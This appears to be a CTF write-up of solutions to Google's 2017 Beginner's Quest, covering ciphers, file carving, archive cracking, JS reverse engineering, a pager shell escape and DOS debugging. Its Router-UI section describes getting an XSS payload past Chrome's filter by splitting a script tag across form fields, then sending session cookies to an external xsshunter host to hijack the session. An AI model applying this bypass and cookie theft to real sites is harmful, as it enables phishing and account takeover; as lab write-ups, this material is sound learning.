# Google 2017, Capture the Flag, Begginer's Quest

## Symbol chart

* BY HAND: means that the solution is reached by simple deductions, using standard tools or with tools downloaded from some source.

* WITH SCRIPT: means that the creation of some file/script was neccesary. Those files will be in this repository.

## Letter: 
==BY HAND==

It's a PDF file. One can simply select and copy the text.

## OCR IS COOL: 
==BY HAND==

While the intention of the challange is to make us use OCR (Optical Character Recognition) and Caesar, one can easily skip the first part. That's because a snippet that reads <THREE LETTERS>{<LETTERS>} can be easily found by hand. Since Caesar only changes the letters around (and there is no other "XXX{<LETTERS>}"), we can be sure this has to be the flag. 

We can see that the distance between "VMY" and "CTF" is 7 to the right. This means a shift 7 is required to convert the former to the latter. With this in mind, we simply apply a "Caesar guesser" (for example, https://cryptii.com/caesar-cipher) with shift 7 to this snippet and we should get the answer.


## MOAR: 
==BY HAND==

This one was pretty obscure, and required me to look for external help. Apparently, MAN uses MORE to display itself (as a pager). MORE allows writting "!" to input a command outside the program itself. Using traditional navigation commands (!ls), one can navigate to a folder that has a file with the password. There you can simply use the command to dump a file in the terminal. (!cat)

## Floppy: 
==WITH SCRIPT==

By examining the file with a Hexeditor one can notice that there are a few items after a long sequence of 0's. Both of these items have names, and are pretty similar to what a .zip file Hex-information would look like. 

We run a python code to remove everything before that long sequence of "0" is finished. The final result then can be unzipped from the resulting file. (If the resulting file hadn't been a zip, we could have run a "file-format guesser" instead)

## Security by Obscurity: 
==WITH SCRIPT==

By using a Hexeditor one can notice the file is zipfile. After decompression it can be seen that the result is also a zipfile. We keep repeating this proccess iteratively until we can no longer decompress (a.k.a. until we find an error).

From that point onwards, we check the format of the file (with a format guesser) and repeat the proccess with the new compression format. We got from "zip" to "xz" to "bz2" to "gzip". We end up with a single encrypted "gzip" file that contains a ".txt." with the flag. 

Currently, I am unsure if the password to disencrypt the zip happens to be intentionally hidden somewhere on the files or in some sequence. Without any sort of clue, an external tool to crack the password is required. Brute force can be used, but only because the password happens to be fairly trivial. An example of a tool that does this is python-zip-cracker (https://github.com/josh-newton/python-zip-cracker). In the end, the flag can be extracted from the disencrypted file. 

## JS Safe: 
==WITH SCRIPT==

Looking at the source code, one can realize that the password is the value that makes the function "x" return True. By extention, that means that the solution is the one that allows env[h] to remain as 0. Since we have access to the source-code, we trim everything down except for the "x" function. Inside the "x" function there is a loop whose values (storage_address, function, value1, value2) are dictated by the string named "code". To properly work with this we add a generic "debugger" function before each execution of loop.

Using the previous function, one can create a custom-made debugger that prints the values only when a certain letter appears as "storage_address" of the operation. From there we can evaluate how the value of each letter is produced. That examination yielded the following result:

* h: The value of this letter is the result of applying the bitwise "or" operation in sequence to the values of "small Koppa" (cyrillic character). In other words, to get env[h] = 0 we need to make sure "small Koppa" = 0 every time. 

* small koppa: This letter simply copies it's value from "thousand" (cyrillic character).

* thousand: This letter is the result of a bitwise "xor" operation applied to pairs of "big koppa"(cyrillic character). Since "small koppa" needs to be 0, "thousand" also needs to be 0, consecutive "big koppa" pairs must be identical between them to force the "xor" operation to yield 0 here.

* big koppa: Each consecutive pair is formed by a value of "small ot" (cyrillic character) and a fixed character (A.K.A. a character that does not depend on the password). These fixed characters can be easily extracted by using our debugger function.

* small ot: This letter takes it's values (one by one) from an array in "big ot" (cyrillic character).

* big ot: It's the result of a single function, in which "Uint8Array" is called on "small uk" (cyrillic character).

* small uk: This letter is defined by applying "sha-256" over our password.

So, going bottoms-up we get that: 

* Our password is hashed with sha-256. =>  Then compared to fixed set of characters (which it must match), resulting in 0 => The following operations are idempotent in 0. => The final result is 0, which yields "true"  when asked "not" => So env[h] = 0 if the hash of our password matches the fixed characters.

The final step is to transform the list of fixed values into hex. (this can be done by hand or by using python. A simple map of 'lambda x: ("0" if int(x) < 16 else "") + hex(int(x))[2:]' does it fast and cleanly) Following the advice in the commented code (search with google), the original value can be found.

# Router-UI: 
==WITH SCRIPT==

The excercise is clear about needing one to make a "phishing campaing" with xss. 

By looking at the page after completing the form, one can see we get the string [username+'//'+password] displayed on the page. Writting commands like [<script>alert(1)</script>] gets captured by Chrome's anti-xss, so it is not that straightforward. The way to bypass this is by splitting the "<script>" markup between the username and password, making use of the '//' inside the tag. This way '<script url="'+'//'+'webpage"></script>' becomes a viable way to avoid being captured by the anti-xss.

Since this is a phishing campaign, there is the need to set up both [a] a landing page and [b] a channel to receive the reflected information. To make things fast (and free) I decided to use "https://www.freewebhostingarea.com" to host the landing page and "https://xsshunter.com" to handle the information reception. (xsshunter has javascript scripts that read information from the host, including -but not limited to- cookies)

The landing page itself is pretty trivial, it posts username and password to the challenge's page, with the webpage being the url of our xsshunter javascript page. The only non-obvious piece of information is that, since some parts of the input worked weird in html/javascript, I had to "encode" the text and "decode" it dynamically during execution.

After sending the mail with the landing page, xsshunter will capture the cookie of the session. Creating a cookie with those values will allow us to enter the page as if we were the real user. Looking at the source-code of the page we can find the FLAG in plaintext as a value of an input field. 

# Floppy 2: 
==BY HAND ==

The task at hand is to understand the ".com" file we got in "Floppy". Looking online, "com" files were executables in DOS.  After lurking around, I found that DOS files are very hard to decompile or reverse-engineer, our best chance is to debug it on the fly and see what we can find. For this, we could use either use FreeDOS or DOSBOX.

To debug I used a tool called "Enchanced DEBUG" (clone of "MS-DEBUG", found here: https://sites.google.com/site/pcdosretro/enhdebug). Using it's interface, one can go to a randombly high direction to reach the end of the program execution (example: "-g 200") and dump the memory of the process by issuing the dump comamand("-d") and then hitting ENTER a few times. The flag can be found in plain-text resting in the middle of the code.